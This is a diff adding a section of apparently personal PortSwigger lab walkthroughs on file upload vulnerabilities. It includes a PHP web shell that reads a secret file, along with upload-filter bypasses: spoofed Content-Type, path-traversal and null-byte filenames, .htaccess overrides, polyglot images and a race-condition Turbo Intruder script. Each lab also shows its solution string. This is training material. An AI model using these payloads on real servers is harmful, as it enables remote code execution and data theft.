@@ -1827,9 +1827,334 @@
 
 ---
 
-<!--
-## **File Upload Vulnerabilities**
--->
+## **[File Upload Vulnerabilities][file_upload_vulnerabilities]**
+
+> 📝 **Note:**
+    <mark>The obvious login process was skipped in the steps.</mark>
+
+1. #### **Remote code execution via web shell upload**
+
+    - Upload an image and take note of the URL flow and the parameters sent, the message  
+    ***The file avatars/1.png has been uploaded.*** will appear.
+
+    ```plaintext
+    ...
+    https://<lab_url>/files/avatars/1.png       GET
+    ...
+    ```
+
+    - Upload the shell, the message  
+    ***The file avatars/shell.php has been uploaded.*** will appear.
+
+    ```plaintext
+    sPIFLQLPxzR8gdRLU7eMjQGPl6PqYKKt
+    ```
+
+2. #### **Web shell upload via Content-Type restriction bypass**
+
+    - Upload an image and take note of the URL flow and the parameters sent, the message  
+    ***The file avatars/1.png has been uploaded.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="1.png"
+        Content-Type: image/png
+
+        PNG
+        ...
+    ...
+    https://<lab_url>/files/avatars/1.png       GET
+    ...
+    ```
+
+    - Try to upload the shell, the message  
+    ***Sorry, file type application/x-php is not allowed. Only image/jpeg and image/png are allowed...*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="shell.php"
+        Content-Type: application/x-php
+
+        <?php echo file_get_contents("/home/carlos/secret"); ?>
+        ...
+    ...
+    ```
+
+    - Send the second **/my-account/avatar POST** request to the **Repeater**.
+    - Set the **Content-Type** to **image/png** and repeat the request, the message
+    ***The file avatars/shell.php has been uploaded.*** will appear.
+
+    ```plaintext
+    aO9Yu9pRE7c7FyVZH1cKN0m3xrswhbwH
+    ```
+
+3. #### **Web shell upload via path traversal**
+
+    - Upload an image and take note of the URL flow and the parameters sent, the message  
+    ***The file avatars/1.png has been uploaded.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="1.png"
+        Content-Type: image/png
+
+        PNG
+        ...
+    ...
+    https://<lab_url>/files/avatars/1.png       GET
+    ...
+    ```
+
+    - Upload the shell, the message  
+    ***The file avatars/shell.php has been uploaded.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="shell.php"
+        Content-Type: application/x-php
+
+        <?php echo file_get_contents("/home/carlos/secret"); ?>
+        ...
+    ...
+    ```
+
+    - Access the file and note the shell isn't executed  
+    (notice that the code is returned as plain text).
+    - Send the second **/my-account/avatar POST** request to the **Repeater**.
+    - Set the **filename** to **%2e%2e%2fshell.php** (**url encoded**) and repeat the request, the message
+    ***The file avatars/../shell.php has been uploaded.*** will appear.
+
+    ```plaintext
+    bCZjeULdhgmTcLNA4xP7hXs67HfFcpNZ
+    ```
+
+4. #### **Web shell upload via extension blacklist bypass**
+
+    - Upload an image and take note of the URL flow and the parameters sent, the message  
+    ***The file avatars/1.png has been uploaded.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="1.png"
+        Content-Type: image/png
+
+        PNG
+        ...
+    ...
+    https://<lab_url>/files/avatars/1.png       GET
+    ...
+    ```
+
+    - Try to upload the shell, the message  
+    ***Sorry, php files are not allowed. Sorry, there was an error uploading your file.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="shell.php"
+        Content-Type: application/x-php
+
+        <?php echo file_get_contents("/home/carlos/secret"); ?>
+        ...
+    ...
+    ```
+
+    - Send the second **/my-account/avatar POST** request to the **Repeater**.
+    - Set the **filename** to **shell.php5** (**alternative php filetype**) and repeat the request, the message
+    ***The file avatars/shell.php5 has been uploaded.*** will appear.
+    - Access the file and note the shell isn't executed  
+    (notice that the code is returned as plain text).
+
+    - Craft and upload a **.htaccess** file to override the server directives.
+
+    ```plaintext
+    AddType application/x-httpd-php .php5 .shtml
+    ```
+
+    - Access the file again and note the shell is now executed.
+
+    ```plaintext
+    wLt1ARkOcqaK1IFlyxGmIqyeMzT8Cuy0
+    ```
+
+5. #### **Web shell upload via obfuscated file extension**
+
+    - Upload an image and take note of the URL flow and the parameters sent, the message  
+    ***The file avatars/1.png has been uploaded.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="1.png"
+        Content-Type: image/png
+
+        PNG
+        ...
+    ...
+    https://<lab_url>/files/avatars/1.png       GET
+    ...
+    ```
+
+    - Try to upload the shell, the message  
+    ***Sorry, only JPG & PNG files are allowed. Sorry, there was an error uploading your file.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="shell.php"
+        Content-Type: application/x-php
+
+        <?php echo file_get_contents("/home/carlos/secret"); ?>
+        ...
+    ...
+    ```
+
+    - Send the second **/my-account/avatar POST** request to the **Repeater**.
+    - Set the **filename** to **shell.php%00.png** (**null byte extension**) and repeat the request, the message
+    ***The file avatars/shell.php has been uploaded.*** will appear.
+
+    ```plaintext
+    mbJNQTJ3knonwoJvxyCPW09LH8aICSGC
+    ```
+
+6. #### **Remote code execution via polyglot web shell upload**
+
+    - Upload an image and take note of the URL flow and the parameters sent, the message  
+    ***The file avatars/1.png has been uploaded.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="1.png"
+        Content-Type: image/png
+
+        PNG
+        ...
+    ...
+    https://<lab_url>/files/avatars/1.png       GET
+    ...
+    ```
+
+    - Try to upload the shell, the message  
+    ***Error: file is not a valid image. Sorry, there was an error uploading your file.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="shell.php"
+        Content-Type: application/x-php
+
+        <?php echo file_get_contents("/home/carlos/secret"); ?>
+        ...
+    ...
+    ```
+
+    v1:
+    - Craft and upload a shell with a **PNG** **[file signature][file_upload_vulnerabilities_file_signature]**, the message  
+    ***The file avatars/shell_fileSignaturePNG.php has been uploaded.*** will appear.
+
+    ```plaintext
+    89 50 4E 47 0D 0A 1A 0A
+    ```
+
+    ```plaintext
+    mbJNQTJ3knonwoJvxyCPW09LH8aICSGC
+    ```
+
+    v2:
+    - Craft and upload a **polyglot** **PHP/PNG** shell with **exiftool**, the message  
+    ***The file avatars/shell_polyglot.php has been uploaded.*** will appear.
+
+    ```bash
+     exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" 1.png -o shell_polyglot.php
+    ```
+
+    ```plaintext
+    mbJNQTJ3knonwoJvxyCPW09LH8aICSGC
+    ```
+
+7. #### **Web shell upload via race condition**
+
+    > 📝 **Note:**
+    <mark>***Due to the generous time window for this race condition, it is possible to solve this lab
+    by manually sending two requests in quick succession using Burp Repeater.***</mark>
+
+    - Upload an image and take note of the URL flow and the parameters sent, the message  
+    ***The file avatars/1.png has been uploaded.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="1.png"
+        Content-Type: image/png
+
+        PNG
+        ...
+    ...
+    https://<lab_url>/files/avatars/1.png       GET
+    ...
+    ```
+
+    - Try to upload the shell, the message  
+    ***Sorry, only JPG & PNG files are allowed. Sorry, there was an error uploading your file.*** will appear.
+
+    ```plaintext
+    https://<lab_url>/my-account/avatar         POST
+        -----------------------------123456789012345678901234567890
+        Content-Disposition: form-data; name="avatar"; filename="shell.php"
+        Content-Type: application/x-php
+
+        <?php echo file_get_contents("/home/carlos/secret"); ?>
+        ...
+    ...
+    ```
+
+    v1:
+    - Send the second **/my-account/avatar POST** request to the repeater.
+    - Send the first **/files/avatar/1.png GET** request to the repeater.
+    - Set the **filename** to **shell.php**.
+    - Repeat both requests quickly.
+
+    ```plaintext
+    TvrJJiw28Sl9nh91kbbosYF5F2NkmN4I
+    ```
+
+    v2:
+    - Setup a **TURBO INTRUDER** attack.
+
+    ```python
+    def queueRequests(target):
+        engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+        request1 = '''<YOUR-POST-REQUEST>'''
+
+        request2 = '''<YOUR-GET-REQUEST>'''
+
+        # the 'gate' argument blocks the final byte of each request until openGate is invoked
+        engine.queue(request1, gate='race1')
+        for x in range(5):
+            engine.queue(request2, gate='race1')
+
+        # wait until every 'race1' tagged request is ready then send the final byte of each request
+        # (this method is non-blocking, just like queue)
+        engine.openGate('race1')
+
+        engine.complete(timeout=60)
+
+
+    def handleResponse(req, interesting):
+        table.add(req)
+    ```
+
+[file_upload_vulnerabilities]: https://portswigger.net/web-security/file-upload
+[file_upload_vulnerabilities_file_signature]: https://www.garykessler.net/library/file_sigs.html
+
+---
 
 ## **[Server-Side Request Forgery (SSRF)][ssrf]**
 
